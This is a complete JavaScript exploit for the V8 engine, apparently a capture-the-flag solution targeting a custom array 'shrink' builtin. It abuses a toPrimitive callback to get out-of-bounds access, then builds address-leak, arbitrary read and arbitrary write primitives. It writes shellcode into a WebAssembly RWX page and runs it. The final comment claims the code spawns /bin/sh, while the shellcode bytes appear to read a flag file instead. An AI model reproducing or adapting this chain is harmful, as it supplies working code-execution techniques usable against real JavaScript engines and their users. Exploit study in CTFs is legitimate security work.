// set args --allow-natives-syntax --shell exp.js

/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

// function dp(x){ %DebugPrint(x); }
// function bp() { %SystemBreak(); }

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

let obj = {'A': 1};
let arr = new Array(100).fill(1.2);
evil = { 
    [Symbol.toPrimitive](hint) {
        arr.length = 0;     // resets elements to <FixedArray[0]> [PACKED_DOUBLE_ELEMENTS]
        arr[0] = 0;         // sets elements to <FixedDoubleArray[17]> [HOLEY_DOUBLE_ELEMENTS]
        if (hint == "number") return 99;
        return null;
    },
};
arr.shrink(evil);

let float_arr = [1.1, 2.2, 2.3];
let obj_arr = [obj, obj] 

// dumps OOB
// for (let i = 0; i < 99; i++) {
//     // console.log("arr[" + i + "] = " + ftoi(arr[i]).toString(16));
// }

var float_arr_map = itof(ftoi(arr[21]) & 0xffffffffn);
// console.log("[*] float_arr_map: 0x" + ftoi(float_arr_map).toString(16));
var obj_arr_map  = itof(ftoi(arr[25]) & 0xffffffffn);
// console.log("[*] obj_arr_map: 0x" + ftoi(obj_arr_map).toString(16));

function addrOf(obj) {
    obj_arr[0] = obj;
    let addr = Number(ftoi(arr[24]) & 0xffffffffn); // OOB to directly reads `obj_arr` elements as float
    return BigInt(addr);
}
// // console.log("obj addr: 0x" + addrOf(obj).toString(16));     // test if it actually works

function v8Read(addr) {
    if (addr % 2n == 0)
        addr += 1n;
    arr[22] = itof((0x6n<<32n) | (addr-0x8n));  // overwriting `float_arr` (size | elements)
    return ftoi(float_arr[0])
}

function v8Write(addr, val) {
    if (addr % 2n == 0)
        addr += 1n;
    arr[22] = itof((0x6n<<32n) | (addr-0x8n));  // overwriting `float_arr` (size | elements)
    float_arr[0] = itof(val)
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
// dp(wasm_instance)

var wasm_trusted_data = v8Read(addrOf(wasm_instance) + 0x8n) >> 32n;
// console.log("[+] trusted data: 0x" + wasm_trusted_data.toString(16));
var rwx = v8Read(wasm_trusted_data + 0x30n);
// console.log("[*] rwx: 0x" + rwx.toString(16));

var shellcode = [
        0x48000000273d8d48n,
        0x0002b8d23148f631n,
        0x000001bf050f0000n,
        0x000000bac6894800n,
        0xb800000040ba4100n,
        0x682f050f00000028n,
        0x2f6674632f656d6fn,
        0x7478742e67616c66n,
        0x00n,
];


function copy(addr, data_arr) {
    let _buf = new ArrayBuffer(0x100);
    let dataview = new DataView(_buf);
    let buf_addr = addrOf(_buf);
    let backing_store_addr = buf_addr - 1n + 0x24n;
    v8Write(backing_store_addr, rwx);
    // dp(_buf)

    for (let i = 0; i < data_arr.length; i++) {
        dataview.setBigUint64(8*i, data_arr[i], true);
    }
}

copy(rwx, shellcode);

// console.log("[+] executing execve('/bin/sh', 0, 0)");
f();